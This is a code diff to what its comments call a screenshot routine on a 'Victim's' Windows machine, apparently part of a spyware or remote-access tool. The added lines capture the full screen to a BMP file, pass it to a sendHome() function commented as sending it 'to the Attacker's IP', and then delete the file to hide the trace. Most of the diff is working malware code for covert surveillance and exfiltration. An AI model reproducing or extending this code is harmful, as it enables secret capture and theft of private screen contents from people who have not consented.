@@ -2,8 +2,11 @@
 
 int screenshot()
 {
+	char translaterPath[MAX_PATH];
+	size_t sizeConverted;
+
 	//Filepath for screenshot
-	TCHAR path[] = _T("C:\\Users\\User\\Desktop\\x.bmp");
+	TCHAR path[] = _T("C:\\Users\\Franco\\Desktop\\x.bmp");
 
 	//Get Victim's screen dimensions.
 	int height = GetSystemMetrics(SM_CYVIRTUALSCREEN) - GetSystemMetrics(SM_YVIRTUALSCREEN);
@@ -52,21 +55,21 @@ int screenshot()
 	//Creates a file out of the BMP object.
 	if (createBMPFile(path, createBitmapInfo(bitmap), bitmap, compatContext))
 	{
-		_tprintf(_T("ERROR: createBMPFile function call."));
+		_tprintf(_T("ERROR: createBMPFile function call ."));
 		return 1;
 	}
 
 	//Delete device context.
 	if (!DeleteDC(compatContext))
 	{
-		_tprintf(_T("ERROR: DeleteDC function call."));
+		_tprintf(_T("ERROR: DeleteDC function call failed."));
 		return 1;
 	}
 
 	//Release device context.
 	if (!ReleaseDC(NULL, screenContext))
 	{
-		_tprintf(_T("ERROR: ReleaseDC function call."));
+		_tprintf(_T("ERROR: ReleaseDC function call failed."));
 		return 1;
 	}
 
@@ -74,7 +77,27 @@ int screenshot()
 	//freeing all system resources associated with the object.
 	if (!DeleteObject(bitmap))
 	{
-		_tprintf(_T("ERROR: DeleteObject function call."));
+		_tprintf(_T("ERROR: DeleteObject function call failed."));
+		return 1;
+	}
+
+	//Convert TCHAR to char buffer.
+	if (wcstombs_s(&sizeConverted, translaterPath, MAX_PATH, path, MAX_PATH))
+	{
+		_tprintf(_T("ERROR: wcstombs_s function call failed."));
+		return 1;
+	}
+
+	//Send screenshot to the Attacker's IP.
+	if (sendHome(translaterPath, 1))
+	{
+		_tprintf(_T("ERROR: sendHome function call failed."));
+	}
+
+	//Delete screenshot after it has been sent.
+	if (!DeleteFileA(translaterPath))
+	{
+		_tprintf(_T("ERROR: DeleteFileA function call failed."));
 		return 1;
 	}
 
@@ -115,8 +138,8 @@ int createBMPFile(LPTSTR filePath, PBITMAPINFO bitmapInfo, HBITMAP bitmap, HDC c
 		return 1;
 	}
 
-	if (!WriteFile(handle, (LPVOID)infoHeader, sizeof(BITMAPINFOHEADER) + infoHeader->biClrUsed
-		* sizeof(RGBQUAD), (LPDWORD)&temp, (NULL)))
+	if (!WriteFile(handle, (LPVOID)infoHeader, sizeof(BITMAPINFOHEADER)
+		+ infoHeader->biClrUsed * sizeof(RGBQUAD), (LPDWORD)&temp, (NULL)))
 	{
 		_tprintf(_T("ERROR: WriteFile function call, header."));
 		return 1;
